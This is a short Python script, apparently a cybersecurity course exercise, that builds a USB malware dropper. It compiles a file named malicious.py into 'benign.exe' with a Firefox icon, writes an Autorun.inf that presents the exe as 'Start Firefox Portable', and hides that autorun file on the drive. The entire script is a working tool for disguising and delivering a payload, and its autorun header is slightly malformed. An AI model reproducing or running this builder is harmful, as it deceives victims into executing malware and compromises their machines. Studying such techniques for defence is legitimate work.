# PyInstaller converts scripts into .exe on windows
import PyInstaller.__main__ # allows script to invoke PyInstaller programmatically, dont need to run command line
import shutil # for high level file ops
import os # interacts with os

filename = "/Users/keiratan/Desktop/Cybersec/python-for-cybersec/additional-files/malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB") #create path to folder/file named USB

if os.path.isfile(exename):
    os.remove(exename)

PyInstaller.__main__.run([
    "/Users/keiratan/Desktop/Cybersec/python-for-cybersec/additional-files/malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

shutil.move(os.path.join(pwd, "dist", exename), pwd)
for d in ["dist", "build", "__pycache__"]:
    if os.path.exists(d):
        shutil.rmtree(d)
if os.path.isfile(exename + ".spec"):
    os.remove(exename + ".spec")

with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")


shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
if os.name == 'nt':
    os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))